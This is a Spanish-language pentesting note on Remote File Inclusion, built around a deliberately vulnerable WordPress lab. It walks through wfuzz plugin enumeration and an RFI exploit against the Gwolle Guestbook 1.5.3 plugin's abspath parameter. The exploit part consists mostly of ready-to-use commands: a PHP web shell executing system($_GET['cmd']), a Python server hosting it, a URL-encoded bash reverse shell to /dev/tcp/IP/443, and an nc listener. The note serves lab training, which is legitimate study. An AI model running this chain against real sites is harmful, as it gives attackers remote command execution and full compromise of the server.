# Remote File Inclusión (RFI)

Tags: #RFI #OWASP #Explotacion

La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- [DVWP](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)

```bash Add commentMore actions
# Este tipo de ataques son convenientes cuando:
1. Podemos apuntar a un archivo php y este archivo interpreta ese lenguaje 
```

## Enumeración de plugin en WP

```bash 
# Forma de descubrir los plugins existentes en un Wordpress

❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/web-content/CMS/wp-plugins.fuzz.txt http://<IP>/FUZZ

	# c = Formato colorizado 
	# hc = Hide Code 404
	# t = Usar 200 peticiones al mismo tiempo
	# w = Ruta absoluta del diccionario a usar
```

## Wordpress plugin Gwolle

```bash 
# Esta vulnerabilidad de RFI se da en un Wordpress en la parte de su plugin 'Gwolle' 1.5.3

❯ http://IP/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<hacker_website>/
```

```bash 
# Del lado del atacante debemos de tener un servidor http ejecutandose con el archivo a compartir

❯ python3 -m http.server 80 
```

```bash 
# Archivo malicioso a compartir 
❯ wp-load.php 

<?php 
	system($_GET['cmd']);

Notas:
	1. Terminar el script de la siguiente manera '?>'
```

```bash 
# Por lo que ahora en la URL al final debemos de agregar '&cmd=' ya que no podemos tener dos '?cmd=' en una misma URL

?abspath=http://<hacker_website>/&cmd=whoami

# Podemos agregar una revershell en la URL de la siguiente manera:
❯ bash -c "bash -i >& /dev/tcp/IP/443 0>&1"
	# El '&' debemos de urlencodearlo = %26
❯ bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"
```

```bash 
# Nos ponemos en escucha en nuestra maquina de atacante para recibir la revershell
❯ nc -nlvp 443 
```

